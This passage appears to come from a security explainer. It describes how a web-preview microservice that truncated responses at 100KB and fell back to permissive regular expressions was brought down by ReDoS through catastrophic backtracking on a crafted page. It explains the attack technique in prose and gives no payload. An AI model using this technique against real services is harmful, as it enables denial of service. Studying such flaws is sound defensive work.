To safely process untrusted external websites for rich media previews, architects implemented strict I/O truncation, severing network connections after a fixed 100KB limit to prevent memory exhaustion. This architectural constraint required a fallback from structured DOM parsing (which fails on truncated documents) to raw Regular Expressions. The security flaw emerged from the misconception that string length limits inherently neutralize ReDoS. The developer crafted permissive, multi-line regular expressions to handle malformed internet HTML, heavily utilizing overlapping exclusion groups (`[^>]+`). The attacker exploited this by hosting a website that deliberately returned a 100KB string perfectly designed to engage the regex capture groups without ever triggering a termination condition. When the background worker processed the stream, the regex engine engaged in catastrophic backtracking. The execution thread locked, entirely exhausting the microservice thread pool and transforming a protective memory-truncation feature into an asynchronous Denial of Service vector
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
